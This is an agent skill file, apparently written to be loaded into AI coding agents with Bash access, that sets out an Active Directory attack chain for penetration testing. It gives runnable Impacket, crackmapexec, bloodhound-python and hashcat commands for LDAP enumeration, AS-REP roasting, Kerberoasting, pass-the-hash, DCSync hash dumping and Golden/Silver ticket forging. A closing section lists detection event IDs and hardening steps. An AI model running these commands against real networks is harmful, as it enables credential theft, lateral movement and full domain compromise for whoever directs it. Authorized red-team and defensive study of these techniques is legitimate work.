---
name: ad-ldap-attack
description: "Active Directory is the backbone of enterprise identity and access management, making it a primary target during internal network penetration tests."
origin: openclaw
version: "0.1.20"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: enterprise
  tool_count: 0
  guide_count: 3
  mitre: "TA0006-Credential Access"
---





# Skill: Active Directory and LDAP Attack

> **Supplementary Files**:
> - `payloads.md` -- Payload collection organized by 10 attack phases (reconnaissance, LDAP enumeration, Kerberos attacks, credential harvesting, lateral movement, domain dominance)
> - `test-cases.md` -- Structured test case templates (8 cases covering full AD attack chain from recon to domain dominance)
> - `guides/ad-recon-enumeration-guide.md` -- Complete AD reconnaissance and enumeration guide
> - `guides/kerberos-attack-guide.md` -- Kerberos attack techniques deep dive
> - `guides/ad-lateral-movement-guide.md` -- Lateral movement and domain dominance guide

## Summary

Ad Ldap Attack skill domain covering enterprise operations.

**Domain**: enterprise

**MITRE ATT&CK**: TA0006-Credential Access

## Description

Active Directory is the backbone of enterprise identity and access management, making it a primary target during internal network penetration tests. This skill covers the complete AD attack lifecycle, from initial reconnaissance and enumeration through credential theft, lateral movement, and ultimately domain dominance. Understanding these techniques is essential for red team operators and penetration testers assessing enterprise environments.

The attack chain typically begins with passive and active reconnaissance to identify domain controllers, trust relationships, and network topology. LDAP enumeration and Kerberos probing reveal user accounts, group memberships, service principal names (SPNs), and security misconfigurations. Credential attacks such as AS-REP Roasting, Kerberoasting, and Pass-the-Hash exploit weaknesses in authentication protocols to harvest plaintext passwords, NTLM hashes, and Kerberos tickets.

Advanced techniques including DCSync extraction, Golden/Silver Ticket forging, and ACL abuse enable persistent domain dominance. This skill emphasizes realistic Kali Linux tooling including the Impacket suite, BloodHound for graph-based attack path analysis, and CrackMapExec for rapid lateral movement across domain-joined systems.

## Use Cases

1. **Internal Network Penetration Testing** -- Perform authorized AD security assessments, enumerate domain objects, harvest credentials, and demonstrate impact through lateral movement to sensitive systems.
2. **Red Team Operations** -- Execute full adversary simulation against enterprise AD environments, from initial foothold to domain admin compromise, using OPSEC-safe techniques.
3. **Kerberos Security Assessment** -- Test Kerberos configuration weaknesses including pre-authentication bypass (AS-REP Roasting), service ticket attacks (Kerberoasting), and ticket forgery (Golden/Silver Tickets).
4. **Privilege Escalation Auditing** -- Identify misconfigured ACLs, delegation privileges, GPO weaknesses, and trust relationship vulnerabilities that enable escalation paths.
5. **Post-Exploitation and Persistence** -- Establish persistent access through credential caching, ticket manipulation, and domain dominance techniques resistant to password resets.

## Core Tools

| Tool | Category | Purpose |
|------|----------|---------|
| impacket-secretsdump.py | Credential Harvesting | Extract hashes from NTDS.dit, perform DCSync attacks, dump SAM/SYSTEM |
| impacket-psexec.py | Lateral Movement | Execute commands via SMB using Pass-the-Hash or credential authentication |
| impacket-wmiexec.py | Lateral Movement | Execute commands via WMI for stealthier remote execution |
| impacket-smbexec.py | Lateral Movement | Execute commands via SMB with minimal footprint |
| impacket-GetNPUsers.py | Kerberos Attack | AS-REP Roasting -- query users with pre-auth disabled |
| impacket-GetUserSPNs.py | Kerberos Attack | Kerberoasting -- request TGS tickets for service accounts |
| impacket-getTGT.py | Kerberos Attack | Request TGT from KDC using credentials or hash |
| impacket-getST.py | Kerberos Attack | Request service tickets, perform S4U attacks |
| impacket-ticketer.py | Kerberos Attack | Forge Golden and Silver Tickets offline |
| impacket-goldenPac.py | Kerberos Attack | Exploit MS14-068 via Golden Ticket for domain admin |
| bloodhound | Attack Path Analysis | Graph-based visualization of AD attack paths and relationships |
| bloodhound-python | Enumeration | Python BloodHound ingestor for data collection without .NET |
| ldapsearch | Enumeration | Direct LDAP queries against domain controllers |
| enum4linux | Enumeration | SMB/NetBIOS enumeration for user, group, and share discovery |
| enum4linux-ng | Enumeration | Modern rewrite of enum4linux with improved output |
| kerberoast | Kerberos Attack | TGS ticket extraction and offline password cracking |
| crackmapexec | Lateral Movement | Network spray tool for SMB, WinRM, LDAP, MSSQL, SSH |
| ldeep | Enumeration | Advanced LDAP enumeration and AD object manipulation |
| ldapdomaindump | Enumeration | Dump AD information via LDAP into formatted HTML/JSON/CSV |
| nbtscan | Reconnaissance | NetBIOS name scanner for network host discovery |
| rpcclient | Enumeration | Windows RPC client for SAMR, LSA, and DS enumeration |

## Methodology

### Phase 1: Reconnaissance

Discover live hosts, identify domain controllers, map network topology, and gather NetBIOS/DNS information about the target domain.

1. Scan the target network for live hosts and open ports (88/Kerberos, 389/LDAP, 445/SMB, 636/LDAPS, 135/RPC)
2. Use `nbtscan` for NetBIOS discovery to identify domain names and machine roles
3. Perform DNS enumeration to locate domain controllers and service records
4. Map domain trust relationships and forest topology

### Phase 2: Enumeration

Enumerate domain users, groups, computers, GPOs, SPNs, ACLs, and trust relationships through LDAP, SMB, and RPC protocols.

1. Use `enum4linux` / `enum4linux-ng` for SMB-based user and share enumeration
2. Query LDAP with `ldapsearch` for detailed object attributes
3. Run `ldapdomaindump` for comprehensive AD data export
4. Collect BloodHound data with `bloodhound-python` for attack path analysis
5. Enumerate SPNs, delegation settings, and ACL configurations via `ldeep`

### Phase 3: Credential Attacks

Exploit Kerberos weaknesses and authentication misconfigurations to harvest credentials.

1. AS-REP Roasting with `GetNPUsers.py` -- target accounts with pre-auth disabled
2. Kerberoasting with `GetUserSPNs.py` -- request TGS tickets for offline cracking
3. Password spraying with `crackmapexec` using common passwords against domain accounts
4. NTLM relay attacks to capture authentication hashes
5. Extract credentials from memory or SAM database on compromised hosts

### Phase 4: Lateral Movement

Move across the domain using harvested credentials, hashes, and tickets.

1. Pass-the-Hash with `crackmapexec`, `psexec.py`, `wmiexec.py`, `smbexec.py`
2. Pass-the-Ticket using forged Kerberos tickets
3. Overpass-the-Hash -- convert NTLM hash to Kerberos TGT
4. WMI and SMB remote command execution
5. WinRM and PowerShell Remoting for interactive sessions

### Phase 5: Domain Dominance

Achieve and maintain persistent control over the entire AD forest.

1. DCSync attack with `secretsdump.py` to extract all domain hashes
2. Golden Ticket creation with `ticketer.py` for persistent domain admin access
3. Silver Ticket forging for targeted service access
4. GPO abuse for pushing malicious settings across the domain
5. ACL and delegation exploitation for persistent privilege escalation
6. Forest and domain trust exploitation for cross-domain compromise

## Practical Steps

### Step 1: Initial Domain Reconnaissance

```bash
# NetBIOS scan to discover hosts and domain names
nbtscan 10.10.0.0/24

# Identify domain controller via DNS
nslookup -type=srv _ldap._tcp.dc._msdcs.corp.local

# Enumerate NetBIOS information of specific host
nbtscan 10.10.0.1
```

### Step 2: SMB and LDAP Enumeration

```bash
# Full enum4linux scan against domain controller
enum4linux -a 10.10.0.1

# Enum4linux-ng for improved enumeration
enum4linux-ng -A 10.10.0.1

# LDAP search for all domain users
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName mail

# Dump entire domain info via LDAP
ldapdomaindump -u 'CORP\svc_ldap' -p 'Password123!' 10.10.0.1
```

### Step 3: BloodHound Data Collection

```bash
# Collect BloodHound data using Python ingestor
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c All

# Alternative: collect specific collection methods
bloodhound-python -u 'svc_ldap' -p 'Password123!' -ns 10.10.0.1 -d corp.local -c DCOnly
```

### Step 4: Kerberos Attacks

```bash
# AS-REP Roasting -- find users with pre-auth disabled
impacket-GetNPUsers corp.local/ -usersfile userlist.txt -format john -outputfile asrep_hashes.txt

# Kerberoasting -- request TGS tickets for service accounts
impacket-GetUserSPNs corp.local/svc_ldap:'Password123!' -request -outputfile tgs_hashes.txt

# Crack TGS hashes offline
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Step 5: Credential Harvesting and Lateral Movement

```bash
# Pass-the-Hash via crackmapexec
crackmapexec smb 10.10.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3fxxx'

# Execute command via psexec
impacket-psexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# Stealthier WMI execution
impacket-wmiexec corp.local/administrator@10.10.0.5 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx

# DCSync attack to dump all domain hashes
impacket-secretsdump corp.local/administrator@10.10.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:3fxxx
```

### Step 6: Golden Ticket and Domain Dominance

```bash
# Forge Golden Ticket using krbtgt hash
impacket-ticketer -nthash 'krbtgt_hash' -domain-sid S-1-5-21-XXXX -domain corp.local administrator

# Use Golden Ticket to access any service
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@10.10.0.5 -k -no-pass

# Silver Ticket for targeted service access
impacket-ticketer -nthash 'service_hash' -domain-sid S-1-5-21-XXXX -domain corp.local -spn cifs/dc01.corp.local -user-id 500 administrator
```

## Defense Perspective

### Detecting Reconnaissance

- Monitor for unusual LDAP query patterns and high-volume enumeration via Event IDs 1644, 2887, 2888, 2889.
- Detect BloodHound SharpHound collectors via process creation, network connections, and LDAP query patterns.
- Alert on `nbtscan` and mass NetBIOS queries from non-standard sources.
- Implement LDAP query auditing and rate limiting on domain controllers.

### Detecting Kerberos Attacks

- AS-REP Roasting: Monitor Event ID 4768 for TGT requests without pre-authentication. Alert when multiple AS-REP requests target different users.
- Kerberoasting: Monitor Event ID 4769 for TGS requests with encryption type 0x17 (RC4). Alert on RC4-downgrade TGS requests, especially for service accounts.
- Golden Tickets: Detect via Event ID 4624 logons with no corresponding TGT request (Event 4768). Monitor for tickets with unusual lifetimes exceeding domain policy.
- Implement AES encryption enforcement for service accounts to mitigate Kerberoasting.

### Detecting Credential Harvesting

- DCSync: Monitor Event ID 4662 for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions usage. Alert on DRSUAPI calls from non-DC systems.
- Credential dumping: Deploy Credential Guard and LSA Protection to protect LSASS. Monitor for LSASS access from unexpected processes.
- Implement Protected Users security group for high-privilege accounts.

### Detecting Lateral Movement

- Monitor Event IDs 4624 (logon type 3 for network, type 10 for remote interactive) for unusual patterns.
- Detect Pass-the-Hash via failed NTLM logons with mismatched source systems.
- Monitor for WMI and PSExec service creation (Event ID 7045, service names like PSEXESVC).
- Implement Windows Defender ATP lateral movement detection and network segmentation.

### Hardening Recommendations

- Enforce strong password policies and regular rotation for service accounts.
- Disable NTLM where possible and enforce Kerberos with AES encryption.
- Implement tiered administration model with Privileged Access Workstations (PAWs).
- Regularly audit AD permissions, delegation settings, and ACL configurations.
- Deploy Microsoft LAPS for local administrator password management.
- Implement Privileged Access Management (PAM) and just-in-time access.
